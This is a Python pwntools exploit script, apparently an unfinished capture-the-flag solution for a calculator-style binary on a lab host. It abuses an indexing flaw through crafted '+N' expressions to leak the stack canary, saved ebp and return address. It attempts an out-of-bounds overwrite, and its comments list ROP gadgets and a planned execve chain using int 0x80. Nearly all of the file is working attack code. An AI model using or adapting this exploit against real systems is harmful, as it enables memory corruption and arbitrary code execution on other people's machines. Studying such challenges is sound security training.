from pwn import *
import pdb
import ctypes

p = remote("192.168.152.131", 8888)

context.log_level = 'info'
logger = logging.getLogger()


def sendLine(msg):
    p.sendline(msg)


def recvLine():
    return p.recvline()


def debug_print(cont):
    print('{:#x}'.format(ctypes.c_uint(int(cont)).value))


if __name__ == "__main__1":
    recvLine()

    # canary 357
    # ret 361

    for i in range(1, 0x17f):
        sendLine("+{}".format(i))
        cont = recvLine()
        if int(cont) != 0:
            print("{}: {:#x}".format(i, ctypes.c_uint(int(cont)).value))


    sendLine("+357")
    canary = int(recvLine())
    print('canary: {:#x}'.format(ctypes.c_uint(int(canary)).value))

    sendLine("+360")
    ebp = int(recvLine())
    print('ebp: {:#x}'.format(ctypes.c_uint(int(ebp)).value))

    sendLine("+361")
    ret = int(recvLine())
    print('ret: {:#x}'.format(ctypes.c_uint(int(ret)).value))
    
    # payload = '+360+1*{}+1*1'.format(ret)
    payload = '+360'+'+1*1431655765'
    
    pdb.set_trace()
    sendLine(payload)

    cont = recvLine()

    print('{:#x}'.format(ctypes.c_uint(int(cont)).value))

    p.interactive()


    # 0x0805c34b  pop eax ; ret
    # 0x080481d1  pop ebx ; ret
    # 0x080701d1 : pop ecx ; pop ebx ; ret
    # 0x08049a21  int 0x80


    '''
    stack

    ret(0x0805c34b) 
    0xb
    ret(0x080481d1)
    bin_addr
    
    
    
    '''

    # esp 0xff998b3c -> return to 0x80493f2
    # ops 0xff998ac8


# calc 360(int) override return address
# esp: 0xfff486fc -> return 0x80493da
# numbers: 0xfff48718



'''
0x0805c34b: pop eax ; ret

0x080481d1: pop ebx ; ret
0x0805932f : xor eax, eax ; pop ebx ; ret

0x080701d1 : pop ecx ; pop ebx ; ret
'''


if __name__ == '__main__':
    recvLine()

    sendLine("+360")
    cont = recvLine()
    debug_print(cont)
    sendLine("+361")
    cont = recvLine()
    debug_print(cont)


    sendLine("+360")
    cont = recvLine()
    debug_print(cont)

    sendLine("+360")
    cont = recvLine()
    debug_print(cont)